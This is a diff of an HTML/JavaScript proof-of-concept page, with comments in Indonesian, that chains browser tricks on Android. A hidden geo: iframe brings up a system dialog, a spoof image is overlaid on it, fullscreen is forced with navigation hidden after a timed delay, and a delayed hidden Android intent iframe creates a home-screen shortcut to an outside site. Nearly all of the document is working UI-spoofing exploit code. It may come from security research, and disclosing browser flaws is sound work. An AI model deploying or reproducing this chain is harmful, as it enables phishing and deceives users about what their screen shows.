@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Chaining & Delayed Intent PoC</title>
+    <title>Ultimate Chaining & Auto-Fade Bypass PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -92,7 +92,7 @@
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE FULL CHAINING & DELAYED INTENT</button>
+        <button id="execBtn">INITIALIZE FULL CHAINING BYPASS</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -102,7 +102,7 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing pointer lock & entering fullscreen...";
+        statusInfo.innerText = "Status: Executing chained security context bypass...";
         this.style.display = "none";
 
         try {
@@ -114,56 +114,58 @@
             });
           }
 
-          // 2. Chaining Step 2: Instan menampilkan visual overlay spoof.png
+          // 2. Chaining Step 2: Intent URI Dispatcher (geo: schema) untuk memicu dialog sistem
+          let spoofFrame = document.createElement("iframe");
+          spoofFrame.style.display = "none";
+          spoofFrame.src = "geo:0,0?q=apple.com";
+          document.body.appendChild(spoofFrame);
+
+          // 3. Chaining Step 3: Instan menampilkan visual overlay spoof.png di atas konteks dialog
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          // 3. Chaining Step 3: Eksekusi Fullscreen terlebih dahulu secara instan
-          let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
+          statusInfo.innerText = "Status: Overlay deployed. Engaging chained Fullscreen lock...";
 
-          let requestFS = fsElement.requestFullscreen || 
-                          fsElement.webkitRequestFullscreen || 
-                          fsElement.mozRequestFullScreen || 
-                          fsElement.msRequestFullscreen;
+          // 4. Chaining Step 4: Eksekusi Fullscreen dengan jeda mikro yang dioptimalkan agar menyatu dengan animasi sistem
+          setTimeout(async () => {
+            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
 
-          if (requestFS) {
-            try {
-              await requestFS.call(fsElement, { navigationUI: "hide" });
-            } catch (err) {
+            let requestFS = fsElement.requestFullscreen || 
+                            fsElement.webkitRequestFullscreen || 
+                            fsElement.mozRequestFullScreen || 
+                            fsElement.msRequestFullscreen;
+
+            if (requestFS) {
               try {
-                await requestFS.call(fsElement);
-              } catch (e) {
-                console.debug("Fullscreen chain fallback error:", e.message);
+                await requestFS.call(fsElement, { navigationUI: "hide" });
+              } catch (err) {
+                try {
+                  await requestFS.call(fsElement);
+                } catch (e) {
+                  console.debug("Fullscreen chain fallback error:", e.message);
+                }
               }
             }
-          }
 
-          let container = document.getElementById("mainContainer");
-          if (container) {
-            container.style.display = "none";
-          }
+            let container = document.getElementById("mainContainer");
+            if (container) {
+              container.style.display = "none";
+            }
 
-          statusInfo.innerText = "Status: Fullscreen active. Geo & Android intent will trigger in 3 seconds...";
+            statusInfo.innerText = "Status: Full chaining active. Android intent will trigger in 3 seconds...";
 
-          // 4. Chaining Step 4: Geo URI & Android Intent dispatch otomatis setelah jeda waktu 3 detik
-          setTimeout(() => {
-            statusInfo.innerText = "Status: Dispatching Geo & Android Intent payloads...";
+            // 5. Tambahan: Eksekusi Android Intent NDevTK secara otomatis 3 detik setelah Fullscreen aktif
+            setTimeout(() => {
+              statusInfo.innerText = "Status: Dispatching delayed Android intent payload...";
+              let intentFrame = document.createElement("iframe");
+              intentFrame.style.display = "none";
+              intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+              document.body.appendChild(intentFrame);
+            }, 3000);
 
-            // Memanggil geo protocol iframe
-            let geoFrame = document.createElement("iframe");
-            geoFrame.style.display = "none";
-            geoFrame.src = "geo:0,0?q=apple.com";
-            document.body.appendChild(geoFrame);
-
-            // Memanggil Android Intent NDevTK
-            let intentFrame = document.createElement("iframe");
-            intentFrame.style.display = "none";
-            intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-            document.body.appendChild(intentFrame);
-
-          }, 3000);
+          }, 300);
 
         } catch (err) {
           statusInfo.innerText = "Status: Chaining execution error: " + err.message;
